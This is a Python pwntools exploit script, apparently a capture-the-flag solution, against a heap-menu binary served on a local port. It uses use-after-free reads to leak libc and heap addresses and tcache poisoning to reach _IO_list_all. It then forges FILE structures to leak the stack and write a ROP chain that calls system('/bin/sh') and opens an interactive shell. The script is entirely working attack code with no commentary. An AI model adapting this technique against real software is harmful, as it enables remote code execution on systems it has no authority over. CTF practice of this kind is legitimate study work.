from pwn import *
context.update(os = 'linux',arch = 'amd64')
context.log_level = 'debug'
binary = '../src/pwn'
elf = ELF(binary)
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    libc = ELF('../src/libc.so.6')
    host = '0.0.0.0'
    port = '1145'
    p = remote(host,port)

hoi_write = lambda write_addr, len, _chain, _vtable: fit({
    0x00: 0x8000 | 0x800 | 0x1000, #_flags
    0x20: write_addr, #_IO_write_base
    0x28: write_addr + len, #_IO_write_ptr
    0x68: _chain, #_chain
    0x70: 1, # _fileno
    0xc0: 0, #_modes
    0xd8: _vtable, #_vtable
}, filler=b'\x00')

hoi_read = lambda read_addr, len, _chain, _vtable: fit({
    0x00: 0x8000 | 0x40 | 0x1000, #_flags
    0x20: read_addr, #_IO_write_base
    0x28: read_addr + len, #_IO_write_ptr
    0x68: _chain, #_chain
    0x70: 0, # _fileno
    0xc0: 0, #_modes
    0xd8: _vtable - 0x8, #_vtable
}, filler=b'\x00')

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
ru = lambda delim: p.recvuntil(delim)
io = lambda: p.interactive()

def add(sz, data):
    sla(b"Your Choice: ", b'1')
    sla(b"size: \n", str(sz).encode())
    sla(b"content: \n", data)

def show(idx):
    sla(b"Your Choice: ", b'2')
    sla(b"idx: \n", str(idx).encode())
    ru(b"content: \n")

def delete(idx):
    sla(b"Your Choice: ", b'3')
    sla(b"idx: \n", str(idx).encode())

def pwn():
    for i in range(10):
        add(0x80, str(i).encode())# 0-9

    for i in range(7):
        delete(i)# 0-6

    delete(8)
    show(8)

    libc.address = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x21ace0
    _IO_file_jumps = libc.sym["_IO_file_jumps"]
    _IO_list_all = libc.sym["_IO_list_all"]
    binsh = next(libc.search(b"/bin/sh"))
    ret = libc.address + 0x0000000000029139
    info(f"libc: {libc.address:#x}")

    delete(7)

    show(0)
    key = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) 
    heapbase = key << 12
    info(f"heapbase: {heapbase:#x}")

    for _ in range(6):
        add(0x80, b'10')# 10-15
    delete(8)

    add(0x70, b'16')# 16
    pay = fit(0, 0x91, key ^ _IO_list_all)
    add(0x30, pay)# 17
    # gdb.attach(p)
    # pause()
    add(0x80, b'18')# 18
    add(0x80, fit(heapbase+0x840))# 19

    fake_io_read = hoi_read(libc.sym["__free_hook"], 0x500, libc.sym["__free_hook"], _IO_file_jumps)

    add(0x80, fake_io_read[:0x80])# 20
    add(0x80, fake_io_read[0x80+0x10:])# 21
    # gdb.attach(p)
    # pause()
    sla(b"Your Choice: ", b'4')

    fake_io_write = hoi_write(libc.sym["environ"], 0x8, libc.sym["__free_hook"]+0x100, _IO_file_jumps)
    fake_io_read = hoi_read(libc.sym["__free_hook"]+0x200, 0x500, libc.sym["__free_hook"]+0x200, _IO_file_jumps)
    pay = fake_io_write.ljust(0x100) + fake_io_read
    sl(pay)

    stack_leak = u64(p.recv(8))
    info(f"stack_leak: {stack_leak:#x}")

    fake_io_read = hoi_read(stack_leak-0x310, 0x100, 0, _IO_file_jumps)
    # gdb.attach(p, "b *_IO_file_read")
    sl(fake_io_read)
    # pause()

    rop = ROP(libc)
    rop.base = stack_leak-0x310
    rop.raw(ret)
    rop.call("system", [binsh])

    info(rop.dump())
    sleep(0.2)
    sl(rop.chain())

    io()
pwn()